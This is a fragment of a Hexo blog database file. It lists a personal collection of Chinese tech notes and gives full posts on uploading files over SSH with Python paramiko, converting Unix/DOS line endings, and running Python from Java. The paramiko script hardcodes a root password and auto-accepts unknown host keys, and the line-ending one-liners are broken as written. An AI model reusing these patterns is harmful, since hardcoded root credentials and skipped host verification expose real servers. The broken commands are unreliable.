nux/yum makecache/index.html","hash":"269191e8907b4aa23b8e89cd67e5f907785c480d","modified":1531228282510},{"_id":"public/2018/07/10/Linux/修改密码，添加用户，配置权限/index.html","hash":"e5386de9f064fb28331427b4255f3877b2b0b599","modified":1531228282510},{"_id":"public/2018/07/10/Linux/修改时间/index.html","hash":"ae82bf72c198d86163463592e869b133ef05766d","modified":1531228282510},{"_id":"public/2018/07/10/Linux/修改语言设置/index.html","hash":"7954ed0d338e4eae5ef1496c38d24ef7c52b244e","modified":1531228282510},{"_id":"public/2018/07/10/Linux/发送邮件/index.html","hash":"637e47c4bf19175eec58501304d643d06869daf9","modified":1531228282510},{"_id":"public/2018/07/10/Linux/命令连接符/index.html","hash":"5b4fccb510e793149f7f161317b299a8971434e6","modified":1531228282510},{"_id":"public/2018/07/10/Linux/安装JDK/index.html","hash":"7c99dbdb497b8c4b6f5a5387cf2fb1cc25d5c1ca","modified":1531228282511},{"_id":"public/2018/07/10/Linux/存储/index.html","hash":"e871b7c61676d0db7cf677355192e5e0f5a39ad7","modified":1531228282511},{"_id":"public/2018/07/10/数据库/语句优化/index.html","hash":"ab83a74023b80e895550a210450ccd543f10956d","modified":1531228282511},{"_id":"public/2018/07/10/Linux/替换jar包中为文件/index.html","hash":"542d973408044a73285d6c7915bf4cf7ac26c3c1","modified":1531228282511},{"_id":"public/2018/07/10/Linux/查看版本/index.html","hash":"8a7c4cede048a115be9268b51dd2c794a0ab4292","modified":1531228282511},{"_id":"public/2018/07/10/Linux/登录到其他服务器/index.html","hash":"68a30460111c704979ce8cd0a40400249fa35c86","modified":1531228282511},{"_id":"public/2018/07/10/Linux/监控登录/index.html","hash":"06bab647ac0e921682d3697698c175e64b5ee40b","modified":1531228282511},{"_id":"public/2018/07/10/Linux/用户/index.html","hash":"00a198c12ccac2771040583269d15031496cf091","modified":1531228282511},{"_id":"public/2018/07/10/Linux/文件互传/index.html","hash":"97f4568e556e9b14ac0d6f50bf91321829ef0e41","modified":1531228282511},{"_id":"public/2018/07/10/Linux/端口/index.html","hash":"f3bd0bc9e515d2fea13e2f081da116c2aa5be7f8","modified":1531228282511},{"_id":"public/2018/07/10/Linux/连接/index.html","hash":"b5ebd034654d6c7682a09018ec3da7a8a2ec26cc","modified":1531228282511},{"_id":"public/2018/07/10/Linux/禁止IP登录访问/index.html","hash":"c9a700e5af1f5d2609b0aa79ccd5b0be4816c997","modified":1531228282511},{"_id":"public/2018/07/10/kafka/kafka删除消息/index.html","hash":"ff4cf2853084bbc7df071d929c784c2f96580865","modified":1531228282511},{"_id":"public/2018/07/10/kafka/kafka命令/index.html","hash":"7c2f137262de8c4456265318ab89e1d62f5c3e04","modified":1531228282511},{"_id":"public/2018/07/10/python/Articles/index.html","hash":"b759d1b555cb15b6b8589e9c87b50e5130a1862b","modified":1531228282511},{"_id":"public/2018/07/10/python/IP代理和测试/index.html","hash":"a45c8d5b83b8cef25fd16f45e7f5e4d6d21ec2e4","modified":1531228282511},{"_id":"public/2018/07/10/python/Python 执行shell命令， 获取时间，切割字符串/index.html","hash":"a49b17793ae4caebd3b167cc3e22a27ebcd6d246","modified":1531228282512},{"_id":"public/2018/07/10/python/Python 连接远程服务/index.html","hash":"8050c9c1529e4093128b55e8742d2ec79d5e32fd","modified":1531228282512},{"_id":"public/2018/07/10/python/TKinter/index.html","hash":"abd1f5ce1a89f5edcdd8d74f4823214a7345d280","modified":1531228282512},{"_id":"public/2018/07/10/python/fuckcode/index.html","hash":"e3ac9ed071b0c84223dabbcb2be92c6336d48780","modified":1531228282512},{"_id":"public/2018/07/10/python/TypeError get() takes no keyword arguments/index.html","hash":"29c87ea61a625ee1fc189671c075e4328872f9f5","modified":1531228282512},{"_id":"public/2018/07/10/python/hello/index.html","hash":"6ed7ef11b10c50d36e0632f9787236a5bcd06507","modified":1531228282512},{"_id":"public/2018/07/10/python/douban/index.html","hash":"0f166a3f0bcf31163edcd3431111f6f6c8b70782","modified":1531228282512},{"_id":"public/2018/07/10/python/py/index.html","hash":"999e31eeae5c716ac3df7886de84897603064e2b","modified":1531228282512},{"_id":"public/2018/07/10/python/scrapy/index.html","hash":"2dd6979201336a8cbe9e5effb19002a2a974fe2e","modified":1531228282512},{"_id":"public/2018/07/10/python/pip数据源设置/index.html","hash":"2d1c0ae573a4074af8559bb2ac9538359cc08bcc","modified":1531228282512},{"_id":"public/2018/07/10/python/shadowsocks/index.html","hash":"e689dfaeef2ad6f6aeabc0366cc070fdd4e79f5c","modified":1531228282512},{"_id":"public/2018/07/10/python/shutIt库/index.html","hash":"307553fe7d468c901e13a68a7825c1cae4e509c3","modified":1531228282512},{"_id":"public/2018/07/10/python/socket编程/index.html","hash":"c3550cba19e5187a46c8095c23e99f4fcfb4e37e","modified":1531228282512},{"_id":"public/2018/07/10/python/sqlite3报错/index.html","hash":"657114867b611dda7ce7920cb63f7576b1f12259","modified":1531228282512},{"_id":"public/2018/07/10/python/代理/index.html","hash":"75aa9cec9364122f26d063d7f9a0bccea00e4170","modified":1531228282512},{"_id":"public/2018/07/10/python/work/index.html","hash":"9036858dc8ad7337bfb9ab6b227b29886e16eea9","modified":1531228282512},{"_id":"public/2018/07/10/python/安装cx_Oracle报错：unable to find vcvarsall.bat/index.html","hash":"3585284778cb50278191e9243530d6bf851e764d","modified":1531228282512},{"_id":"public/2018/07/10/python/安装python3/index.html","hash":"c28c88c3e9f4906d3a9bad4d6a483afc53bfc54f","modified":1531228282513},{"_id":"public/2018/07/10/python/计算一个目录页下所有文件夹的大小/index.html","hash":"dd619e0c643fd5060276c8be6e6d08e0bd291870","modified":1531228282513},{"_id":"public/2018/07/10/python/音频处理/index.html","hash":"ac1ce4c07944e80b7f9c1a1943d36f3ba49a8f38","modified":1531228282513},{"_id":"public/2018/07/10/python/执行某一目录下的所有shell脚本/index.html","hash":"46b08e99cada688aac1e7fe93b4e939e8d703b43","modified":1531228282513},{"_id":"public/2018/07/10/spark/1.spark windows编译/index.html","hash":"42becbb13f2315b6493cd4ae0a341f19506dc09b","modified":1531228282513},{"_id":"public/2018/07/10/spark/2.windows配置spark运行环境/index.html","hash":"cd245101acc23b1eef29609043fffb8be113448c","modified":1531228282513},{"_id":"public/2018/07/10/spark/6.sparkRDDS/index.html","hash":"b6705c64e31d54725656e81c529b1144e4cb7420","modified":1531228282513},{"_id":"public/2018/07/10/spark/8.scala方法定义/index.html","hash":"04df1719790965462691915873c725d577e589c3","modified":1531228282513},{"_id":"public/2018/07/10/spark/9.JavaScript，Scala，spark中的闭包/index.html","hash":"6ce10b2443eb8b1760680f78305f0d7658e74bbc","modified":1531228282513},{"_id":"public/2018/07/10/spark/SparkStream例子HdfsWordCount/index.html","hash":"9115795a24969d5b04afcd87ed8cb04bc050fec5","modified":1531228282513},{"_id":"public/2018/07/10/web/Spring配置/index.html","hash":"ea097a54df46059770012c7341e32fa3aa570e63","modified":1531228282513},{"_id":"public/2018/07/10/web/tomcat远程登录manager配置/index.html","hash":"27b61cafd0e9f1c7378b012b3e62945b950c77a5","modified":1531228282513},{"_id":"public/2018/07/10/开发工具/Conda Anaconda/index.html","hash":"3b423f8104f17128afb5bffa9c089c04799b649b","modified":1531228282513},{"_id":"public/2018/07/10/其他/墨菲定律、二八法则、马太效应、手表定理、零和游戏、酒与污水定律、水桶定律、蘑菇管理原理/index.html","hash":"9bb77be9a43d7ba94f3b2916b10f2545fb480cf8","modified":1531228282513},{"_id":"public/2018/07/10/开发工具/conda操作/index.html","hash":"5433edfe305edaec9bcd56641e62b9b8166221df","modified":1531228282513},{"_id":"public/2018/07/10/开发工具/mavean/index.html","hash":"e0582b739bf8e297b43a4a80bec8f5722cbaeaf7","modified":1531228282513},{"_id":"public/2018/07/10/开发工具/git把本地项目push到远程仓库/index.html","hash":"16bad2b567c2b8e0a3d9a32aa823d68f4edaece8","modified":1531228282514},{"_id":"public/2018/07/10/开发工具/idea 配置缓存历史记录/index.html","hash":"08b44576011345afc9d05569a6358f1f0b3869bf","modified":1531228282514},{"_id":"public/2018/07/10/数据库/select 执行过程/index.html","hash":"a9ed5fcaff83ee7bca49cd805f9955b62666df90","modified":1531228282514},{"_id":"public/2018/07/10/数据库/sql语句/index.html","hash":"0df1e916eebd38d4f28cfb449197701fa79241dc","modified":1531228282514},{"_id":"public/2018/07/10/数据库/sql左联错误示范/index.html","hash":"8178faf860cfb62330ddffcf12bff64c31abff9f","modified":1531228282514},{"_id":"public/tags/其他/index.html","hash":"a9550d931a4c9c94db4c0b608a2f609ff65364ac","modified":1531228282523},{"_id":"public/tags/数据库/index.html","hash":"c64d2e6c336a2e0ccef61cd3e436753b2156b107","modified":1531228282523},{"_id":"public/tags/开发工具/index.html","hash":"d5c05961afbe0ab0c3b09d15552ff95c15093b33","modified":1531228282523},{"_id":"public/tags/项目/index.html","hash":"ae07fcadbadc5066381d6d1174ce8c414cefdde1","modified":1531228282523},{"_id":"public/2018/07/10/数据库/redis/redis增删改查----Spring+redis/index.html","hash":"8c51db14a4cf5b7543eeb652a224ed3907da4058","modified":1531228282523},{"_id":"public/2018/07/10/数据库/mysql/mysql存储过程/index.html","hash":"b835aeb72102538dd2c0e2cf7cd844c15ccddb9c","modified":1531228282523},{"_id":"public/2018/07/10/Hadoop/sqoop-sqoop使用示例/index.html","hash":"3b8125554752f26a28f8d7112dc0a56aa0002d63","modified":1531228282523},{"_id":"public/2018/07/10/Hadoop/报错处理/index.html","hash":"413f4312ea1b889f0fef43ce0ae75090485a1373","modified":1531228282523},{"_id":"public/2018/07/10/Java/Java反射/index.html","hash":"9562ab98f2ab38ce53467e2d4aa95c3f1b21b6b0","modified":1531228282523},{"_id":"public/2018/07/10/Java/Java注解获取/index.html","hash":"c493b3bca1a0e006adcbd915b270b0170684f333","modified":1531228282523},{"_id":"public/2018/07/10/Java/内存溢出/index.html","hash":"16993674de4af105f80f9163a97b728dadf6e552","modified":1531228282523},{"_id":"public/2018/07/10/Java/注解/index.html","hash":"012cfe3a6af929ffdacebbd54b4d1806c7c30eac","modified":1531228282523},{"_id":"public/2018/07/10/Java/通过反射优化工厂模式/index.html","hash":"18043dfe474963b6baf3fd67fbd2ff33c00f92eb","modified":1531228282523},{"_id":"public/2018/07/10/Linux/安装Hive，本地模式/index.html","hash":"54a5e85ca6be3980948e903062d2fc04fbc54f2e","modified":1531228282524},{"_id":"public/2018/07/10/kafka/kafka发布消息报错LEADER_NOT_AVAILABLE/index.html","hash":"b2e54232492df3108be22facf3fc2d868537d5d3","modified":1531228282524},{"_id":"public/2018/07/10/kafka/zookeeper客户端查看kafka配置/index.html","hash":"e77b730f299dae7a76c5d0923fc43b0131ef2245","modified":1531228282524},{"_id":"public/2018/07/10/python/Python操作excel/index.html","hash":"914cf5bd00e924ca076fa222b2048235a4bfdd54","modified":1531228282524},{"_id":"public/2018/07/10/python/Python面向对象/index.html","hash":"f780f1afa7e61a272dad17bfe72c449b57990262","modified":1531228282524},{"_id":"public/2018/07/10/spark/10.RDD基本操作/index.html","hash":"60794cfd2a0cac7b0788dc0369e097a1a62ec09e","modified":1531228282524},{"_id":"public/2018/07/10/spark/4.scala、maven、spark下的wordcount程序/index.html","hash":"8764dece831d5d8312041582474c79158c600651","modified":1531228282524},{"_id":"public/2018/07/10/spark/3.linux上运行spark程序/index.html","hash":"fb080d48894cbb0a2c27cb5cd84a45cfef8d7525","modified":1531228282524},{"_id":"public/2018/07/10/spark/5.spark程序提交集群和监控/index.html","hash":"58e9e816eb00429f07462f91df14f17a1c7462e9","modified":1531228282524},{"_id":"public/2018/07/10/spark/7.Scala关键字class和object/index.html","hash":"407853f7d66e8100ae82e239fb64a74550bfd944","modified":1531228282524},{"_id":"public/2018/07/10/work/sql/index.html","hash":"06c957a1154a1501b871ada5be2b073a0469c1d9","modified":1531228282524},{"_id":"public/2018/07/10/开发工具/maven插件/index.html","hash":"84a0075294cbebca8439670c3398121fe274d438","modified":1531228282524},{"_id":"public/2018/07/10/开发工具/maven配置阿里云仓库/index.html","hash":"8f1407e7cdcb3ab060a5771456e7a5af663af36f","modified":1531228282524}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Python上传本地文件到Linux指定目录","date":"2018-06-18T08:04:15.000Z","_content":"```\r\nimport paramiko\r\n\r\n#服务器信息\r\nIP = '10.0.0.1'\r\nUSER = 'root'\r\nPASSWORD = '000000'\r\n\r\n#文件信息\r\nfile_update = 'hello.js'\r\nREMORE_PATH = '/usr/test/'\r\nLOCAL_PATH = 'textchat.js'\r\ncmd_rm = 'rm '+REMORE_PATH+file_update\r\n\r\n#删除\r\ns = paramiko.SSHClient()\r\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r\ns.connect(hostname=IP, username=USER, password=PASSWORD)\r\nout_rm = s.exec_command(cmd_rm)\r\ns.close\r\n\r\n#上传\r\nt = paramiko.Transport((IP,22))\r\nt.connect(username=USER,password=PASSWORD)\r\ns = paramiko.SFTPClient.from_transport(t)\r\ns.put(LOCAL_PATH,REMORE_PATH+file_update)\r\nt.close\r\n```","source":"_posts/Python上传本地文件到Linux指定目录.md","raw":"---\ntitle: Python上传本地文件到Linux指定目录\ndate: 2018-06-18 16:04:15\ntags: note\n---\n```\r\nimport paramiko\r\n\r\n#服务器信息\r\nIP = '10.0.0.1'\r\nUSER = 'root'\r\nPASSWORD = '000000'\r\n\r\n#文件信息\r\nfile_update = 'hello.js'\r\nREMORE_PATH = '/usr/test/'\r\nLOCAL_PATH = 'textchat.js'\r\ncmd_rm = 'rm '+REMORE_PATH+file_update\r\n\r\n#删除\r\ns = paramiko.SSHClient()\r\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r\ns.connect(hostname=IP, username=USER, password=PASSWORD)\r\nout_rm = s.exec_command(cmd_rm)\r\ns.close\r\n\r\n#上传\r\nt = paramiko.Transport((IP,22))\r\nt.connect(username=USER,password=PASSWORD)\r\ns = paramiko.SFTPClient.from_transport(t)\r\ns.put(LOCAL_PATH,REMORE_PATH+file_update)\r\nt.close\r\n```","slug":"Python上传本地文件到Linux指定目录","published":1,"updated":"2018-07-10T13:10:09.845Z","_id":"cjj2qgrfc0000m0tjcakjl2m6","comments":1,"layout":"post","photos":[],"link":"","content":"<pre><code>import paramiko\n\n#服务器信息\nIP = &apos;10.0.0.1&apos;\nUSER = &apos;root&apos;\nPASSWORD = &apos;000000&apos;\n\n#文件信息\nfile_update = &apos;hello.js&apos;\nREMORE_PATH = &apos;/usr/test/&apos;\nLOCAL_PATH = &apos;textchat.js&apos;\ncmd_rm = &apos;rm &apos;+REMORE_PATH+file_update\n\n#删除\ns = paramiko.SSHClient()\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\ns.connect(hostname=IP, username=USER, password=PASSWORD)\nout_rm = s.exec_command(cmd_rm)\ns.close\n\n#上传\nt = paramiko.Transport((IP,22))\nt.connect(username=USER,password=PASSWORD)\ns = paramiko.SFTPClient.from_transport(t)\ns.put(LOCAL_PATH,REMORE_PATH+file_update)\nt.close\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<pre><code>import paramiko\n\n#服务器信息\nIP = &apos;10.0.0.1&apos;\nUSER = &apos;root&apos;\nPASSWORD = &apos;000000&apos;\n\n#文件信息\nfile_update = &apos;hello.js&apos;\nREMORE_PATH = &apos;/usr/test/&apos;\nLOCAL_PATH = &apos;textchat.js&apos;\ncmd_rm = &apos;rm &apos;+REMORE_PATH+file_update\n\n#删除\ns = paramiko.SSHClient()\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\ns.connect(hostname=IP, username=USER, password=PASSWORD)\nout_rm = s.exec_command(cmd_rm)\ns.close\n\n#上传\nt = paramiko.Transport((IP,22))\nt.connect(username=USER,password=PASSWORD)\ns = paramiko.SFTPClient.from_transport(t)\ns.put(LOCAL_PATH,REMORE_PATH+file_update)\nt.close\n</code></pre>"},{"title":"Pro","date":"2018-06-18T08:04:15.000Z","_content":"##### 1. 通用的东西一人写，多人审核\n##### 2. 代码风格统一\n##### 3. 有人做决定\n##### 4. 分工明确","source":"_posts/Pro.md","raw":"---\ntitle: Pro\ndate: 2018-06-18 16:04:15\ntags: note\n---\n##### 1. 通用的东西一人写，多人审核\n##### 2. 代码风格统一\n##### 3. 有人做决定\n##### 4. 分工明确","slug":"Pro","published":1,"updated":"2018-07-10T13:10:09.844Z","_id":"cjjedmh6i00000gtjv7qxc1jv","comments":1,"layout":"post","photos":[],"link":"","content":"<h5 id=\"1-通用的东西一人写，多人审核\"><a href=\"#1-通用的东西一人写，多人审核\" class=\"headerlink\" title=\"1. 通用的东西一人写，多人审核\"></a>1. 通用的东西一人写，多人审核</h5><h5 id=\"2-代码风格统一\"><a href=\"#2-代码风格统一\" class=\"headerlink\" title=\"2. 代码风格统一\"></a>2. 代码风格统一</h5><h5 id=\"3-有人做决定\"><a href=\"#3-有人做决定\" class=\"headerlink\" title=\"3. 有人做决定\"></a>3. 有人做决定</h5><h5 id=\"4-分工明确\"><a href=\"#4-分工明确\" class=\"headerlink\" title=\"4. 分工明确\"></a>4. 分工明确</h5>","site":{"data":{}},"excerpt":"","more":"<h5 id=\"1-通用的东西一人写，多人审核\"><a href=\"#1-通用的东西一人写，多人审核\" class=\"headerlink\" title=\"1. 通用的东西一人写，多人审核\"></a>1. 通用的东西一人写，多人审核</h5><h5 id=\"2-代码风格统一\"><a href=\"#2-代码风格统一\" class=\"headerlink\" title=\"2. 代码风格统一\"></a>2. 代码风格统一</h5><h5 id=\"3-有人做决定\"><a href=\"#3-有人做决定\" class=\"headerlink\" title=\"3. 有人做决定\"></a>3. 有人做决定</h5><h5 id=\"4-分工明确\"><a href=\"#4-分工明确\" class=\"headerlink\" title=\"4. 分工明确\"></a>4. 分工明确</h5>"},{"title":"Unix格式文件转Dos","date":"2018-06-18T08:04:15.000Z","_content":"#### 1.Linux和windows下文件格式不统一\n> 原因：\n\nWindows下换行使用CR...LF两个字符来表示\n\n- 其中CR为回车（ASCII=0x0D）\n\n- LF为换行（ASCII=0x0A）\n\nLinux下使用LF一个字符来表示。\n> 结果\n\n在Linux下编辑或者程序生成的文件导出到windows后会出现乱码或解析出错的问题。\n\n#### 2.Unix和DOS文件的相互转化\n\n1. 使用Linux工具或者命令\n>  dos2unix工具\n\n>  tr命令\n\n>  Emacs编辑器\n\n2. 使用vim 编辑器\n\n```\nvim file\n\nDOS转UNIX：:set fileformat=unix\n\nUNIX转DOS：:set fileformat=dos\n\n:wq\n\n```\n\n3.使用脚本语言处理\n\nPerl Python等，也是把换行符做处理。\n\nPython：\n```\n# DOS转UNIX：\nPython -c “importsys; map(sys.stdout.write, (l[:-2] + ‘\\n’ for l in sys.stdin.readlines()))”< dosfile.txt > unixfile.txt\n\n# UNIX转DOS：\npython -c “importsys; map(sys.stdout.write, (l[:-1] + ‘\\r\\n’ for l in sys.stdin.readlines()))”< dosfile.txt > unixfile.txt\n```\n\n#### 3.vim编辑器下对文件的一些操作\n\n- 格式相互转化\n\n  set fileformats=unix,dos\n\n  \n>   shell、python等脚本需要保存为unix格式\n\n> 在linux下直接运行时会提示：No such file or directory\n因为Linux把换行符也当成脚本解释器的一部分了。\n-  查看文件格式\n\n   set fileformat\n\n- 设置文件末尾是否自动增加换行符\n\n   set endofline/noendofline \n- 设置是否显示不可见字符\n\n  set list/nolist ","source":"_posts/Unix格式文件转Dos.md","raw":"---\ntitle: Unix格式文件转Dos\ndate: 2018-06-18 16:04:15\ntags: note\n---\n#### 1.Linux和windows下文件格式不统一\n> 原因：\n\nWindows下换行使用CR...LF两个字符来表示\n\n- 其中CR为回车（ASCII=0x0D）\n\n- LF为换行（ASCII=0x0A）\n\nLinux下使用LF一个字符来表示。\n> 结果\n\n在Linux下编辑或者程序生成的文件导出到windows后会出现乱码或解析出错的问题。\n\n#### 2.Unix和DOS文件的相互转化\n\n1. 使用Linux工具或者命令\n>  dos2unix工具\n\n>  tr命令\n\n>  Emacs编辑器\n\n2. 使用vim 编辑器\n\n```\nvim file\n\nDOS转UNIX：:set fileformat=unix\n\nUNIX转DOS：:set fileformat=dos\n\n:wq\n\n```\n\n3.使用脚本语言处理\n\nPerl Python等，也是把换行符做处理。\n\nPython：\n```\n# DOS转UNIX：\nPython -c “importsys; map(sys.stdout.write, (l[:-2] + ‘\\n’ for l in sys.stdin.readlines()))”< dosfile.txt > unixfile.txt\n\n# UNIX转DOS：\npython -c “importsys; map(sys.stdout.write, (l[:-1] + ‘\\r\\n’ for l in sys.stdin.readlines()))”< dosfile.txt > unixfile.txt\n```\n\n#### 3.vim编辑器下对文件的一些操作\n\n- 格式相互转化\n\n  set fileformats=unix,dos\n\n  \n>   shell、python等脚本需要保存为unix格式\n\n> 在linux下直接运行时会提示：No such file or directory\n因为Linux把换行符也当成脚本解释器的一部分了。\n-  查看文件格式\n\n   set fileformat\n\n- 设置文件末尾是否自动增加换行符\n\n   set endofline/noendofline \n- 设置是否显示不可见字符\n\n  set list/nolist ","slug":"Unix格式文件转Dos","published":1,"updated":"2018-07-10T13:10:09.851Z","_id":"cjjedmh6n00010gtj2qcq50w5","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1-Linux和windows下文件格式不统一\"><a href=\"#1-Linux和windows下文件格式不统一\" class=\"headerlink\" title=\"1.Linux和windows下文件格式不统一\"></a>1.Linux和windows下文件格式不统一</h4><blockquote>\n<p>原因：</p>\n</blockquote>\n<p>Windows下换行使用CR…LF两个字符来表示</p>\n<ul>\n<li><p>其中CR为回车（ASCII=0x0D）</p>\n</li>\n<li><p>LF为换行（ASCII=0x0A）</p>\n</li>\n</ul>\n<p>Linux下使用LF一个字符来表示。</p>\n<blockquote>\n<p>结果</p>\n</blockquote>\n<p>在Linux下编辑或者程序生成的文件导出到windows后会出现乱码或解析出错的问题。</p>\n<h4 id=\"2-Unix和DOS文件的相互转化\"><a href=\"#2-Unix和DOS文件的相互转化\" class=\"headerlink\" title=\"2.Unix和DOS文件的相互转化\"></a>2.Unix和DOS文件的相互转化</h4><ol>\n<li>使用Linux工具或者命令<blockquote>\n<p> dos2unix工具</p>\n</blockquote>\n</li>\n</ol>\n<blockquote>\n<p> tr命令</p>\n</blockquote>\n<blockquote>\n<p> Emacs编辑器</p>\n</blockquote>\n<ol start=\"2\">\n<li>使用vim 编辑器</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim file</span><br><span class=\"line\"></span><br><span class=\"line\">DOS转UNIX：:set fileformat=unix</span><br><span class=\"line\"></span><br><span class=\"line\">UNIX转DOS：:set fileformat=dos</span><br><span class=\"line\"></span><br><span class=\"line\">:wq</span><br></pre></td></tr></table></figure>\n<p>3.使用脚本语言处理</p>\n<p>Perl Python等，也是把换行符做处理。</p>\n<p>Python：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># DOS转UNIX：</span><br><span class=\"line\">Python -c “importsys; map(sys.stdout.write, (l[:-2] + ‘\\n’ for l in sys.stdin.readlines()))”&lt; dosfile.txt &gt; unixfile.txt</span><br><span class=\"line\"></span><br><span class=\"line\"># UNIX转DOS：</span><br><span class=\"line\">python -c “importsys; map(sys.stdout.write, (l[:-1] + ‘\\r\\n’ for l in sys.stdin.readlines()))”&lt; dosfile.txt &gt; unixfile.txt</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-vim编辑器下对文件的一些操作\"><a href=\"#3-vim编辑器下对文件的一些操作\" class=\"headerlink\" title=\"3.vim编辑器下对文件的一些操作\"></a>3.vim编辑器下对文件的一些操作</h4><ul>\n<li><p>格式相互转化</p>\n<p>set fileformats=unix,dos</p>\n</li>\n</ul>\n<blockquote>\n<p>  shell、python等脚本需要保存为unix格式</p>\n</blockquote>\n<blockquote>\n<p>在linux下直接运行时会提示：No such file or directory<br>因为Linux把换行符也当成脚本解释器的一部分了。</p>\n<ul>\n<li>查看文件格式</li>\n</ul>\n</blockquote>\n<p>   set fileformat</p>\n<ul>\n<li><p>设置文件末尾是否自动增加换行符</p>\n<p> set endofline/noendofline </p>\n</li>\n<li><p>设置是否显示不可见字符</p>\n<p>set list/nolist </p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-Linux和windows下文件格式不统一\"><a href=\"#1-Linux和windows下文件格式不统一\" class=\"headerlink\" title=\"1.Linux和windows下文件格式不统一\"></a>1.Linux和windows下文件格式不统一</h4><blockquote>\n<p>原因：</p>\n</blockquote>\n<p>Windows下换行使用CR…LF两个字符来表示</p>\n<ul>\n<li><p>其中CR为回车（ASCII=0x0D）</p>\n</li>\n<li><p>LF为换行（ASCII=0x0A）</p>\n</li>\n</ul>\n<p>Linux下使用LF一个字符来表示。</p>\n<blockquote>\n<p>结果</p>\n</blockquote>\n<p>在Linux下编辑或者程序生成的文件导出到windows后会出现乱码或解析出错的问题。</p>\n<h4 id=\"2-Unix和DOS文件的相互转化\"><a href=\"#2-Unix和DOS文件的相互转化\" class=\"headerlink\" title=\"2.Unix和DOS文件的相互转化\"></a>2.Unix和DOS文件的相互转化</h4><ol>\n<li>使用Linux工具或者命令<blockquote>\n<p> dos2unix工具</p>\n</blockquote>\n</li>\n</ol>\n<blockquote>\n<p> tr命令</p>\n</blockquote>\n<blockquote>\n<p> Emacs编辑器</p>\n</blockquote>\n<ol start=\"2\">\n<li>使用vim 编辑器</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim file</span><br><span class=\"line\"></span><br><span class=\"line\">DOS转UNIX：:set fileformat=unix</span><br><span class=\"line\"></span><br><span class=\"line\">UNIX转DOS：:set fileformat=dos</span><br><span class=\"line\"></span><br><span class=\"line\">:wq</span><br></pre></td></tr></table></figure>\n<p>3.使用脚本语言处理</p>\n<p>Perl Python等，也是把换行符做处理。</p>\n<p>Python：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># DOS转UNIX：</span><br><span class=\"line\">Python -c “importsys; map(sys.stdout.write, (l[:-2] + ‘\\n’ for l in sys.stdin.readlines()))”&lt; dosfile.txt &gt; unixfile.txt</span><br><span class=\"line\"></span><br><span class=\"line\"># UNIX转DOS：</span><br><span class=\"line\">python -c “importsys; map(sys.stdout.write, (l[:-1] + ‘\\r\\n’ for l in sys.stdin.readlines()))”&lt; dosfile.txt &gt; unixfile.txt</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-vim编辑器下对文件的一些操作\"><a href=\"#3-vim编辑器下对文件的一些操作\" class=\"headerlink\" title=\"3.vim编辑器下对文件的一些操作\"></a>3.vim编辑器下对文件的一些操作</h4><ul>\n<li><p>格式相互转化</p>\n<p>set fileformats=unix,dos</p>\n</li>\n</ul>\n<blockquote>\n<p>  shell、python等脚本需要保存为unix格式</p>\n</blockquote>\n<blockquote>\n<p>在linux下直接运行时会提示：No such file or directory<br>因为Linux把换行符也当成脚本解释器的一部分了。</p>\n<ul>\n<li>查看文件格式</li>\n</ul>\n</blockquote>\n<p>   set fileformat</p>\n<ul>\n<li><p>设置文件末尾是否自动增加换行符</p>\n<p> set endofline/noendofline </p>\n</li>\n<li><p>设置是否显示不可见字符</p>\n<p>set list/nolist </p>\n</li>\n</ul>\n"},{"title":"Java运行Python","date":"2018-06-18T08:04:15.000Z","_content":"```\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\n/**\n * Created by hello.\n */\npublic class testpy {\n\n    private static String path = testpy.class.getResource(\"/\").getPath() + \"python/test.py\";\n\n    public static String hello() {\n        String hello = \".....\";\n        try {\n            System.out.println(\"start\");\n            System.out.println(path);\n            Process pr = Runtime.getRuntime().exec(\"python \" + path);\n            BufferedReader in = new BufferedReader(new InputStreamReader(\n                    pr.getInputStream()));\n            String line;\n            while ((line = in.readLine()) != null) {\n                System.out.println(line);\n                hello = line;\n            }\n            in.close();\n            pr.waitFor();\n            System.out.println(\"end\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return hello;\n    }\n}\n```","source":"_posts/Java运行Python.md","raw":"---\ntitle: Java运行Python\ndate: 2018-06-18 16:04:15\ntags: note\n---\n```\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\n/**\n * Created by hello.\n */\npublic class testpy {\n\n    private static String path = testpy.class.getResource(\"/\").getPath() + \"python/test.py\";\n\n    public static String hello() {\n        String hello = \".....\";\n        try {\n            System.out.println(\"start\");\n            System.out.println(path);\n            Process pr = Runtime.getRuntime().exec(\"python \" + path);\n            BufferedReader in = new BufferedReader(new InputStreamReader(\n                    pr.getInputStream()));\n            String line;\n            while ((line = in.readLine()) != null) {\n                System.out.println(line);\n                hello = line;\n            }\n            in.close();\n            pr.waitFor();\n            System.out.println(\"end\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return hello;\n    